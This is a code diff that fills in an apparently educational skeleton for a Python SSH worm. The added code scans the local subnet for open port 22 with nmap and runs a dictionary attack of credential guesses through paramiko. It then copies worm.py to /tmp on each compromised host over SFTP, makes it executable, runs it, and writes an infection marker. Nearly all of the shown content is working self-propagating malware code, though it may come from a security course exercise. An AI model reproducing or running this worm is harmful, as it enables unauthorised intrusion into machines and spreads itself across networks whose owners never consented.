@@ -37,7 +37,7 @@ def isInfectedSystem():
 # Marks the system as infected
 #################################################################
 def markInfected():
-	f = open(INFECTED_MARKER_FILE) 
+	f = open(INFECTED_MARKER_FILE, "w+") 
 	f.write("This file is infected.")
 	f.close()	
 	# Mark the system as infected. One way to do
@@ -52,6 +52,10 @@ def markInfected():
 ###############################################################
 def spreadAndExecute(sshClient):
 	
+	sftpClient = sshClient.open_sftp()
+	sftpClient.put("worm.py", "/tmp/" + "worm.py")
+	sshClient.exec_command("chmod a+x /tmp/worm.py")
+	sshClient.exec_command("python /tmp/worm.py")	
 	# This function takes as a parameter 
 	# an instance of the SSH class which
 	# was properly initialized and connected
@@ -78,13 +82,15 @@ def spreadAndExecute(sshClient):
 def tryCredentials(host, userName, password, sshClient):
 	
 	try:
-		ssh = paramiko.SSHClient()
-		ssh.connect(host,username=userName,password=password)
+		sshClient.connect(host,username=userName,password=password)
+		
 	except socket.error:
+		print "socket error"
 		return 3
 	except paramiko.SSHException:
+		print "sshexceptio"
 		return 1
-
+	print userName + password + "correct credentials"
 	return 0
 	# Tries to connect to host host using
 	# the username stored in variable userName
@@ -106,7 +112,7 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-	pass
+
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -131,7 +137,8 @@ def attackSystem(host):
 				
 	# Go through the credentials
 	for (username, password) in credList:
-		
+		if not tryCredentials(host, username, password, ssh):
+			return (ssh,);	
 		# TODO: here you will need to
 		# call the tryCredentials function
 		# to try to connect to the
@@ -175,12 +182,15 @@ def getMyIP(interface):
 # @return - a list of IP addresses on the same network
 #######################################################
 def getHostsOnTheSameNetwork():
-	
+	portScanner = nmap.PortScanner()
+	portScanner.scan('192.168.1.0/24',arguments='-p 22 --open')
+	hostInfo=portScanner.all_hosts()
+		
 	# TODO: Add code for scanning
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.	
-	pass
+	return hostInfo
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -195,6 +205,7 @@ if len(sys.argv) < 2:
 	if isInfectedSystem():
 		exit()
 	else:
+	
 		markInfected()
 				
 	# TODO: If we are running on the victim, check if 
